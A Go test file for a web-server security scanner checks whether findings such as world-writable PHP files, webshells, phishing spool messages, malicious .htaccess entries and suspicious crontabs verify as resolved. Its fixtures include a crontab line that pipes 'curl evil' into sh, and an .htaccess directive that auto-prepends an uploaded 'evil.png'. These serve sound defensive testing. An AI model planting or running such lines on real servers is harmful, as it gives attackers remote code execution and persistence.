package checks

import (
	"os"
	"path/filepath"
	"testing"
)

func withQuarantineAllowedRoots(t *testing.T, dir string) {
	t.Helper()
	old := fixQuarantineAllowedRoots
	fixQuarantineAllowedRoots = []string{dir}
	t.Cleanup(func() { fixQuarantineAllowedRoots = old })
}

func withHtaccessAllowedRoots(t *testing.T, dir string) {
	t.Helper()
	old := fixHtaccessAllowedRoots
	fixHtaccessAllowedRoots = []string{dir}
	t.Cleanup(func() { fixHtaccessAllowedRoots = old })
}

func TestVerifyFindingWorldWritable(t *testing.T) {
	tmp := t.TempDir()
	withFixPermissionsAllowedRoots(t, tmp)

	fixed := filepath.Join(tmp, "fixed.php")
	if err := os.WriteFile(fixed, []byte("<?php"), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(fixed, 0644); err != nil {
		t.Fatal(err)
	}
	res := VerifyFinding("world_writable_php", "", "", fixed)
	if !res.Checked || !res.Resolved {
		t.Errorf("fixed file should verify resolved, got %+v", res)
	}

	loose := filepath.Join(tmp, "loose.php")
	if err := os.WriteFile(loose, []byte("<?php"), 0666); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(loose, 0666); err != nil {
		t.Fatal(err)
	}
	res = VerifyFinding("world_writable_php", "", "", loose)
	if !res.Checked || res.Resolved {
		t.Errorf("still world-writable file should verify unresolved, got %+v", res)
	}
}

func TestVerifyFindingGroupWritable(t *testing.T) {
	tmp := t.TempDir()
	withFixPermissionsAllowedRoots(t, tmp)

	target := filepath.Join(tmp, "g.php")
	if err := os.WriteFile(target, []byte("<?php"), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(target, 0660); err != nil {
		t.Fatal(err)
	}
	if res := VerifyFinding("group_writable_php", "", "", target); !res.Checked || res.Resolved {
		t.Errorf("group-writable file should verify unresolved, got %+v", res)
	}
	if err := os.Chmod(target, 0644); err != nil {
		t.Fatal(err)
	}
	if res := VerifyFinding("group_writable_php", "", "", target); !res.Checked || !res.Resolved {
		t.Errorf("group-fixed file should verify resolved, got %+v", res)
	}
}

func TestVerifyFindingMissingFileResolved(t *testing.T) {
	tmp := t.TempDir()
	withFixPermissionsAllowedRoots(t, tmp)
	res := VerifyFinding("world_writable_php", "", "", filepath.Join(tmp, "gone.php"))
	if !res.Checked || !res.Resolved {
		t.Errorf("missing file should verify resolved, got %+v", res)
	}
}

func TestVerifyFindingSymlinkNotVerifiable(t *testing.T) {
	tmp := t.TempDir()
	withFixPermissionsAllowedRoots(t, tmp)
	real := filepath.Join(tmp, "real.php")
	if err := os.WriteFile(real, []byte("x"), 0644); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(tmp, "link.php")
	if err := os.Symlink(real, link); err != nil {
		t.Fatal(err)
	}
	if res := VerifyFinding("world_writable_php", "", "", link); res.Checked {
		t.Errorf("symlink should not be auto-verifiable, got %+v", res)
	}
}

func TestVerifyFindingQuarantineFamilyPresenceBased(t *testing.T) {
	tmp := t.TempDir()
	withQuarantineAllowedRoots(t, tmp)

	present := filepath.Join(tmp, "shell.php")
	if err := os.WriteFile(present, []byte("<?php"), 0644); err != nil {
		t.Fatal(err)
	}
	if res := VerifyFinding("webshell", "", "", present); !res.Checked || res.Resolved {
		t.Errorf("present webshell should verify unresolved, got %+v", res)
	}
	if res := VerifyFinding("phishing_page", "", "", filepath.Join(tmp, "gone.html")); !res.Checked || !res.Resolved {
		t.Errorf("removed file should verify resolved, got %+v", res)
	}
}

func TestVerifyFindingHtaccess(t *testing.T) {
	tmp := t.TempDir()
	withHtaccessAllowedRoots(t, tmp)

	dirty := filepath.Join(tmp, ".htaccess")
	if err := os.WriteFile(dirty, []byte("php_value auto_prepend_file \"/home/u/public_html/uploads/evil.png\"\n"), 0644); err != nil {
		t.Fatal(err)
	}
	if res := VerifyFinding("htaccess_auto_prepend", "", "", dirty); !res.Checked || res.Resolved {
		t.Errorf("malicious .htaccess should verify unresolved, got %+v", res)
	}

	clean := filepath.Join(tmp, "clean", ".htaccess")
	if err := os.MkdirAll(filepath.Dir(clean), 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(clean, []byte("# nothing dangerous\nOptions -Indexes\n"), 0644); err != nil {
		t.Fatal(err)
	}
	if res := VerifyFinding("htaccess_injection", "", "", clean); !res.Checked || !res.Resolved {
		t.Errorf("clean .htaccess should verify resolved, got %+v", res)
	}
}

func TestVerifyFindingHtaccessNonHtaccessNotVerifiable(t *testing.T) {
	tmp := t.TempDir()
	withHtaccessAllowedRoots(t, tmp)
	notH := filepath.Join(tmp, "config.php")
	if err := os.WriteFile(notH, []byte("x"), 0644); err != nil {
		t.Fatal(err)
	}
	if res := VerifyFinding("htaccess_injection", "", "", notH); res.Checked {
		t.Errorf("non-.htaccess path should not be auto-verifiable, got %+v", res)
	}
}

func TestVerifyFindingEximSpool(t *testing.T) {
	tmp := t.TempDir()
	oldSpool := eximSpoolDirs
	eximSpoolDirs = []string{tmp}
	t.Cleanup(func() { eximSpoolDirs = oldSpool })

	msgID := "1abcde-123456-AB"
	msg := "Phishing email queued (message: " + msgID + ")"
	// No spool file present -> resolved.
	if res := VerifyFinding("email_phishing_content", msg, ""); !res.Checked || !res.Resolved {
		t.Errorf("absent spool message should verify resolved, got %+v", res)
	}
	// Header file present -> unresolved.
	if err := os.WriteFile(filepath.Join(tmp, msgID+"-H"), []byte("hdr"), 0600); err != nil {
		t.Fatal(err)
	}
	if res := VerifyFinding("email_phishing_content", msg, ""); !res.Checked || res.Resolved {
		t.Errorf("queued spool message should verify unresolved, got %+v", res)
	}
}

func TestVerifyFindingCrontab(t *testing.T) {
	tmp := t.TempDir()
	withCrontabAllowedRoots(t, tmp)

	cron := filepath.Join(tmp, "baduser")
	if err := os.WriteFile(cron, []byte("* * * * * curl evil|sh\n"), 0600); err != nil {
		t.Fatal(err)
	}
	if res := VerifyFinding("suspicious_crontab", "", "", cron); !res.Checked || res.Resolved {
		t.Errorf("non-empty crontab should verify unresolved, got %+v", res)
	}
	if err := os.WriteFile(cron, nil, 0600); err != nil {
		t.Fatal(err)
	}
	if res := VerifyFinding("suspicious_crontab", "", "", cron); !res.Checked || !res.Resolved {
		t.Errorf("emptied crontab should verify resolved, got %+v", res)
	}
}

func TestVerifyFindingUnknownTypeNotVerifiable(t *testing.T) {
	if res := VerifyFinding("brute_force", "SSH brute force", ""); res.Checked {
		t.Errorf("unknown type should not be auto-verifiable, got %+v", res)
	}
}

func TestVerifyFindingEmptyPathNotVerifiable(t *testing.T) {
	if res := VerifyFinding("world_writable_php", "no path here", ""); res.Checked {
		t.Errorf("missing path should not be auto-verifiable, got %+v", res)
	}
}
